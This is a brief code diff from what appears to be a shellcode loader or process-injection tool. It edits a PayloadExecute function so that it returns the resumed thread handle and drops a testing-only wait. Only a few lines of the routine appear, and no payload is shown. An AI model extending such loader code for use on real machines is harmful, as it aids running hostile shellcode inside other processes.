@@ -48,8 +48,9 @@ BOOL PayloadExecute(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, 
 	}
 
 	pResumeThread(hThread);
+
+	if (phThread)
+		*phThread = hThread;
 	
-    // Just for testing purposes (TO REMOVE)
-	WaitForSingleObject(hThread, INFINITE);
 	return TRUE;
 }
